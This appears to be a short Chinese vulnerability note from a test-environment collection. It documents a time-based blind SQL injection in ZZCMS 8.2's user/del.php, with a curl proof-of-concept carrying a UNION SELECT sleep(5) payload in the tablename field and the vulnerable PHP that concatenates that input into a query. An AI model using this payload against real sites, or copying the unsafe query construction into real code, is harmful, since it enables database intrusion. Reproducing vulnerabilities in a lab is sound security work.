### user/del.php 无回显注入

测试镜像

* src/zzcms/8.2/

影响版本

* 8.2

参考链接

* [ZZCMS v8.2 最新版SQL注入漏洞](http://www.freebuf.com/vuls/161888.html)

Poc

```
curl '127.0.0.1/user/del.php' -d 'id=1&tablename=zzcms_answer union select 1, sleep(5)%23'
```

关键代码

```
# 获取表名后，使用 switch/case 去分别处理
$tablename=trim($_POST["tablename"]);

...

# 在默认分支，拼接了这个参数导致注入
$sql="select id,editor from ".$tablename." where id ='$id'";
```

